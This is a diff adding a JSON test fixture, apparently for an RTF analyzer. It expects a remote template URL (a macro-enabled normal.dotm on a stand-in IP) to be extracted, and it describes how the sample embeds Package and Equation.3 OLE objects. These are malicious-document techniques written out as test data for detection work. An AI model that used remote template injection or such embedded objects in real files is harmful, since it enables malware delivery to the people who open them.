@@ -1,0 +1,8 @@
+{
+ "field": "rtf.template_target",
+ "expected": "http://203.0.113.9/tpl/normal.dotm",
+ "generator_cmd": "python3 -I gen.py two_objects.rtf plain.rtf  (stdlib writer: OLE1 ObjectHeader = struct.pack('<II',0x501,2)+lenprefixed class/topic/item+native, hex-encoded into {\\\\*\\\\objdata}, 64-col lines; Package + Equation.3; {\\\\*\\\\template http://203.0.113.9/tpl/normal.dotm}; {\\\\author Ma\\\\'efa O\\\\{x\\\\} Dubois})",
+ "oracle_cmd": "python3 -I -c \"import re,sys; d=open(sys.argv[1],'rb').read(); print(re.search(rb'\\\\\\\\\\*\\\\\\\\template ([^}]*)', d).group(1))\" two_objects.rtf -> b'http://203.0.113.9/tpl/normal.dotm'",
+ "decoy": false,
+ "member": "invoice.rtf"
+}
